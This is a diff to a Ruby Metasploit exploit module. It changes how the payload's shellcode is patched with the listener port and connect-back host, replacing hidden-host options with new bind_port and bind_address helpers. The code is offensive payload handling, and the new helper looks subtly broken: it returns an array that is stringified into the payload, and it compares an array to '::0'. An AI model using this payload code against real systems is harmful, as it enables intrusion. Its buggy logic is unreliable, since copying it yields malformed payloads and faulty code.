@@ -134,11 +134,7 @@ module Metasploit3
     p[p.length - 4, 4] = [p[p.length - 4, 4].unpack("l")[0] + jmp_offset].pack("V")
 
     # patch the LPORT
-    unless datastore['HIDDENPORT'].nil? or datastore['HIDDENPORT'] == 0
-      lport = datastore['HIDDENPORT']
-    else
-      lport = datastore['LPORT']
-    end
+    lport = bind_port
 
     lportloc = p.index("\x68\x5c\x11\x00\x00")  # PUSH DWORD 4444
     p[lportloc+1] = [lport.to_i].pack('V')[0]
@@ -148,11 +144,7 @@ module Metasploit3
 
     # append LHOST and return payload
 
-    unless datastore['HIDDENHOST'].nil? or datastore['HIDDENHOST'].empty?
-      lhost = datastore['HIDDENHOST']
-    else
-      lhost = datastore['LHOST']
-    end
+    lhost = bind_address
     p + lhost.to_s + "\x00"
 
   end
@@ -163,5 +155,33 @@ module Metasploit3
   def wfs_delay
     20
   end
+
+protected
+
+  def bind_port
+    port = datastore['ReverseListenerBindPort'].to_i
+    port > 0 ? port : datastore['LPORT'].to_i
+  end
+
+  def bind_address
+    # Switch to IPv6 ANY address if the LHOST is also IPv6
+    addr = Rex::Socket.resolv_nbo(datastore['LHOST'])
+    # First attempt to bind LHOST. If that fails, the user probably has
+    # something else listening on that interface. Try again with ANY_ADDR.
+    any = (addr.length == 4) ? "0.0.0.0" : "::0"
+
+    addrs = [ Rex::Socket.addr_ntoa(addr), any  ]
+
+    if not datastore['ReverseListenerBindAddress'].to_s.empty?
+      # Only try to bind to this specific interface
+      addrs = [ datastore['ReverseListenerBindAddress'] ]
+
+      # Pick the right "any" address if either wildcard is used
+      addrs[0] = any if (addrs[0] == "0.0.0.0" or addrs == "::0")
+    end
+
+    addrs
+  end
+
 end
 
